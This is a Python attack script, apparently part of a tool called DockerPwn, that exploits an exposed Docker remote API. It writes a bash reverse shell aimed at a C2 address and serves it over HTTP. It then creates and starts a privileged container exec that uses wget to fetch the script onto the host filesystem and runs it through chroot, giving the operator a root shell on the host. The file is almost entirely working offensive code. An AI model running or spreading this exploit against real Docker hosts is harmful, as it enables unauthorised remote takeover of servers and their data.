import http.client
import json
import sys
import re
import os
from subprocess import Popen

def attack(target, port, containerID, c2):

    dockerConnection = http.client.HTTPConnection(target, port)

    headers = {
        'X-Requested-With': 'DockerPwn.py',
        'Content-Type': 'application/json',
    }

    revShell = "#!/bin/bash\n" + "bash -i >& /dev/tcp/" + c2.split(":")[0] + "/" +c2.split(":")[1] + " 0>&1"

    f = open("shell.sh", "w+")
    f.write(revShell)
    f.close()
    httpsrv = Popen(['python3', '-m', 'http.server', '80'])
    print('[+] Phew, alright. Creating the EXEC to trigger shell.\n')


    execJSON = json.dumps({
        "AttachStdin": True,
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", "wget http://" + c2.split(":")[0] + "/shell.sh -O /host/tmp/shell.sh; chroot /host bash /tmp/shell.sh"],
        "DetachKeys": "ctrl-p,ctrl-q",
        "Privileged": True,
        "Tty": True,
    })
    
    dockerConnection.request('POST', '/containers/' + containerID[0] + '/exec', execJSON, headers)
    execResponse = dockerConnection.getresponse()
    
    if execResponse.status == 201:
        execResponse = str(execResponse.read())
        execID = re.findall(r'[A-Fa-f0-9]{64}', execResponse)
        print('[+] EXEC successfully created on container! Got ID ' + execID[0] + '!\n')
        dockerConnection.close()
    else:
        print('[-] EXEC creation failed. Maybe try again?\n')
        dockerConnection.close()
        sys.exit(0)

    print('[+] Now triggering the EXEC to create chroot shell.\n')

    triggerJSON = json.dumps({
        "Detach": False,
        "Tty": False
    })

    dockerConnection.request('POST', '/exec/' + execID[0] + '/start', triggerJSON, headers)
    triggerResponse = dockerConnection.getresponse()

    if triggerResponse.status == 200:
        print('[+] EXEC successfully triggered. Chrooted container shell coming your way.\n')
        httpsrv.kill()
        os.remove('shell.sh')
        dockerConnection.close()
    else:
        print('[-] EXEC job did not trigger. Maybe our ID was wrong?')
        sys.exit(0)